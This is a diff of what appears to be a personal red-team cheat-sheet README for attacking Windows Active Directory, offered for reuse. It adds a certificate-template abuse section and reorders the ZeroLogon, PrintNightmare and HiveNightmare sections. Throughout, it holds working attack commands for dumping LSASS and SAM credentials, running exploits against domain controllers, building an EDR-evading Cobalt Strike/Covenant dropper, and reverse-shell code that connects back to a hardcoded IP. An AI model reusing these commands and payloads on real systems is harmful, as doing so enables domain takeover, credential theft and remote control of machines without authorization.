@@ -55,8 +55,9 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Covenant Grunt](#convenant-grunt)
 * **[Low Hanging Fruits](#low-hanging-fruits)**
 	* [ZeroLogon](#zerologon)
-	* [PrintNightmare](#printnightmare)
 	* [HiveNightmare](#hivenightmare)
+* **[PrintNightmare](#printnightmare)**
+* **[PKI Abuse](#pki-abuse)**
 * **[File Transfer](#file-transfer)**
 * **[Reverse Shells](#reverse-shells)**
 	* [php](#php-reverse-shell)
@@ -67,7 +68,7 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [jenkins](#jenkins-reverse-shell)
 	* [lua](#lua-reverse-shell)
 	* [jsp](#jsp-reverse-shell)
-	
+
 
 ## ACLs possible abuse
 ACL/ACE | Object | Permission | Abuse | ScreenShot
@@ -79,9 +80,9 @@ ACL/ACE | Object | Permission | Abuse | ScreenShot
 **GenericWrite** | Group | ability to self add to group | [Self add to group](#add-users-to-group) | ![](./src/images/GenericWrite_Group.PNG)
 **GenericWrite</br>WriteProperty** | Computer | Write/update object's attributes | [RBCD](#resource-based-constrained-delegation) |
 **GenericWrite</br>AllExtendedWrite</br>GenericAll</br>WriteOwner</br>WriteProperty** | GPO | Write object's properties | [Add self to local admin](#gpo-abuse-with-powerview) |
-**WriteDACL** | Domain | modify object's ACE (full control) | [Give owned users DCsync Privilege](#add-dcsync-to-object) | 
+**WriteDACL** | Domain | modify object's ACE (full control) | [Give owned users DCsync Privilege](#add-dcsync-to-object) |
 **WriteOwner** | User  | change owner/password | [Change user's password with credential](#change-password-with-credential) |
-**Self-Membership/Self** | Group | ability to add ourself to the group | [Self add to group](#add-users-to-group) | 
+**Self-Membership/Self** | Group | ability to add ourself to the group | [Self add to group](#add-users-to-group) |
 **ExtendedRights** | User  | change user's password | [Force change user's password](#force-change-user-password) | ![](./src/images/AllExtendedRights.PNG)
 **ExtendedRights** | Group  | Read LAPS Password | [Read LAPS Password](#read-laps-local-administrator-password) |
 **User-Force-Change-Password** | User | change user's password | [Force change user's password](#force-change-user-password) | ![](./src/images/Force-Change-User-Password.PNG)
@@ -101,7 +102,7 @@ ACL/ACE | Object | Permission | Abuse | ScreenShot
 | `Get-DomainComputer -Unconstrained` | Get all unconstrained domain computers|`(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))`
 | `Get-DomainGPO` | Get all domain GPO|`(&(objectCategory=groupPolicyContainer))`
 
-Example use: 
+Example use:
 ```
 ([adsisearcher]"<ldapfilter>").FindAll()
 ```
@@ -157,7 +158,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:
 # Use pypykatz
 pypykatz lsa minidump lsass.dmp
 
-# Use mimikatz's minidump 
+# Use mimikatz's minidump
 mimikatz# sekurlsa::minidump <Path_to_file>\lsass.dmp
 mimikatz# sekurlsa::logonpasswords
 ```
@@ -189,7 +190,7 @@ Rubeus.exe ptt /ticket:ticket.kirbi
 
 ## Constrained Delegation
 ### s4u delegation
-This attack is possible if _msds-AllowedToDelegateTo_ is set. 
+This attack is possible if _msds-AllowedToDelegateTo_ is set.
 * with rc4 hash in hand
 ```
 # Request TGT + TGS
@@ -207,7 +208,7 @@ Rubeus.exe s4u /user:attacker /ticket:<base64-blob> /impersonateuser:administrat
 ## Resource-Based Constrained Delegation
 This attack is possible if owned user/computer object has _GenericWrite_ or write privilege to user/computer object attributes. Since we have write privilege, we can write to _msds-allowedtoactonbehalfofotheridentity_ property.
 1. Import ADModule
-2. Set _msds-allowedtoactonbehalfofotheridentity_ to owned computer/user objects. 
+2. Set _msds-allowedtoactonbehalfofotheridentity_ to owned computer/user objects.
 ```
 Set-ADComputer -Identity dc01 -PrincipalsAllowedToDelegateToAccount (Get-ADComputer mycomputer)
 ```
@@ -369,7 +370,7 @@ mimikatz# sekurlsa::pth /user:administrator /ntlm:<ntlm hash> /domain:CONTOSO /r
 mimikatz# sekurlsa::pth /user:administrator /aes256:<aes256 key> /domain:CONTOSO /run:powershell.exe
 ```
 
-### Request TGT 
+### Request TGT
 _Note: This will be log by the KDC_
 ```
 # With plain-text
@@ -380,7 +381,7 @@ Rubeus.exe asktgt /user:administraot /rc4:<rc4-hash> /domain:contoso /ptt
 ```
 
 ### runas
-This method will spawn a new process as the user. This wont validate your password, so make sure you enter it right. Slowly but surely :) 
+This method will spawn a new process as the user. This wont validate your password, so make sure you enter it right. Slowly but surely :)
 ```
 runas /user:contoso\administrator /netonly powershell
 ```
@@ -458,7 +459,7 @@ PsExec.exe -accepteula \\dc01.contoso.local powershell
 ## Generate VBScript dropper (APC process injection)
 Make sure to download [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript.git) and [Donut](https://github.com/TheWover/donut.git)._Note:This method probably won't 100% bypass EDR/AV._
 ### Cobalt Strike Beacon
-For cobalt strike, this aggressor script called [**ShellCode Generator**](https://github.com/RCStep/CSSG) is very useful to generate shellcode with custom formatting. This cna also helps to obfuscate with XOR or AES method. 
+For cobalt strike, this aggressor script called [**ShellCode Generator**](https://github.com/RCStep/CSSG) is very useful to generate shellcode with custom formatting. This cna also helps to obfuscate with XOR or AES method.
 
 1. Generate shellcode and this is my default configuration
 ![SG](src/images/shellcode_generator.png)
@@ -478,7 +479,7 @@ GadgetToJScript.exe -b -w vbs -o beacon -c .\real.cs
 For covenant, since its already has its built in .NET generator. You can use donut to further obfuscate the assembly/
 
 1. Generate **binary** from Covenant
-2. Obfuscate and convert to byte array with **Donut**. It will then generate into .bin file. 
+2. Obfuscate and convert to byte array with **Donut**. It will then generate into .bin file.
 ```powershell
 donut.exe -f .\Grunt.exe
 ```
@@ -494,7 +495,7 @@ $filename='<file-path-to>\payload.bin'
 ```powershell
 .\GadgetToJScript.exe -b -w vbs -o realtest -c .\real.cs
 ```
-6. Execute on remote computer 
+6. Execute on remote computer
 ```powershell
 wscript.exe .\realtest.vbs
 ```
@@ -505,7 +506,7 @@ wscript.exe .\realtest.vbs
 
 ## Low Hanging Fruits
 ### ZeroLogon
-Set the computer account's password to null allowing attackers to perform [DCSync](#dcsync) attack with null authentication 
+Set the computer account's password to null allowing attackers to perform [DCSync](#dcsync) attack with null authentication
 1. Run exploit script [here](https://github.com/risksense/zerologon.git)
 ```
 python3 set_empty_pw.py DC01 10.10.10.10
@@ -516,7 +517,28 @@ python3 set_empty_pw.py DC01 10.10.10.10
 python3 secretsdump.py -just-dc -no-pass testlab/DC01\$@10.10.10.10
 ```
 
-### PrintNightmare
+### HiveNightmare
+1. Check if system is vulnerable with the following commands
+```
+# Check if BUILTIN/Users has read permission
+icacls C:\Windows\System32\config\SAM
+
+# Check if shadow copy is available
+vssadmin list shadows
+```
+
+2. Dump SYSTEM Hive with mimikatz
+```
+# mimikatz (On remote computer)
+mimikatz# lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
+
+# secretsdump.py (Local)
+secretsdump.py -sam SAM-file -system SYSTEM-file LOCAL
+```
+
+Note that the above methods is the manual way. This has been implemented in a automated C# code called [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare). Once you retrieve admin's ntlm, you can do lots of stuff including [changing password](https://twitter.com/gentilkiwi/status/1417467063883476992) or [Pass The Hash](#overpass-the-hash-opth)/PsExec/Evil-Winrm...
+
+## PrintNightmare
 Abusing printer spooler service (CVE-2021-34527) to load malicious DLL and execute as SYSTEM. Available POCs can be found here
 | Link          | Authors         |Language|
 | ------------- | ------------- | ----- |
@@ -543,26 +565,42 @@ smbserver.py smbshare `pwd` -smb2support
 python3 CVE-2021-1675.py testlab/testuser:'P@$$w0rd!'@10.10.10.10 '\\10.10.10.10\smbshare\encme.dll' [-hashes :NTLM]
 ```
 
-### HiveNightmare
-1. Check if system is vulnerable with the following commands
+## PKI Abuse
+### Enumerate CA(s) on the domain
 ```
-# Check if BUILTIN/Users has read permission
-icacls C:\Windows\System32\config\SAM
+python3 certi.py list '<domain>/<username>' -k -n --dc-ip <dc-ip> --class ca
+```
+### Enumerate for vulnerable templates
+```
+# Windows
+Certify.exe find /clientauth
 
-# Check if shadow copy is available
-vssadmin list shadows
+# Linux
+python3 certi.py list '<domain>/<username>' -k -n --dc-ip <dc-ip> --vuln --enable
+```
+### Request cert from CA
+```
+# Windows
+Certify.exe request /ca:dc.legitcorp.local\CA01 /template:vuln-template
+
+# Linux
+python3 certi.py req '<domain>/<username>@<ca-server>' <ca-service-name> -k -n --dc-ip <dc-ip> --template <vuln-template> --alt-name <target-domain-account>
+```
+### Retrieve TGT by using the certificate
+```
+# Windows
+Rubeus.exe asktgt /user:lowpriv /certificate:cert.pfc /password:P@$$w0rd
+
+# Linux
+python3 gettgtpkinit.py <domain>/<username> -cert-pfx <pfx-certificate-file> -pfx-pass <certificate-password> admin_tgt.ccache   
+```
+### Retrieve NTLM hash (optional)
+At this point, you can either use environment variable `KRB5CCNAME` to be used with ccache file or you can either get ntlm hash from the ticket with the following Commands
+```
+python3 getnthash.py -key <AS-REP-encryption-key> -dc-ip <dc-ip> <domain>/<username> output_tgt.ccache
 ```
 
-2. Dump SYSTEM Hive with mimikatz
-```
-# mimikatz (On remote computer)
-mimikatz# lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM 
-
-# secretsdump.py (Local)
-secretsdump.py -sam SAM-file -system SYSTEM-file LOCAL
-```
-
-Note that the above methods is the manual way. This has been implemented in a automated C# code called [HiveNightmare](https://github.com/GossiTheDog/HiveNightmare). Once you retrieve admin's ntlm, you can do lots of stuff including [changing password](https://twitter.com/gentilkiwi/status/1417467063883476992) or [Pass The Hash](#overpass-the-hash-opth)/PsExec/Evil-Winrm...
+For detailed example, you may refer to this awesome [gist](!https://gist.github.com/Flangvik/15c3007dcd57b742d4ee99502440b250) by [@Flangvik](!https://twitter.com/Flangvik)
 
 ## File Transfer
 
@@ -661,7 +699,7 @@ int main(void){
     revsockaddr.sin_port = htons(port);
     revsockaddr.sin_addr.s_addr = inet_addr("192.168.86.139");
 
-    connect(sockt, (struct sockaddr *) &revsockaddr, 
+    connect(sockt, (struct sockaddr *) &revsockaddr,
     sizeof(revsockaddr));
     dup2(sockt, 0);
     dup2(sockt, 1);
@@ -702,7 +740,7 @@ namespace ConnectBack
 					using(StreamReader rdr = new StreamReader(stream))
 					{
 						streamWriter = new StreamWriter(stream);
-						
+
 						StringBuilder strInput = new StringBuilder();
 
 						Process p = new Process();
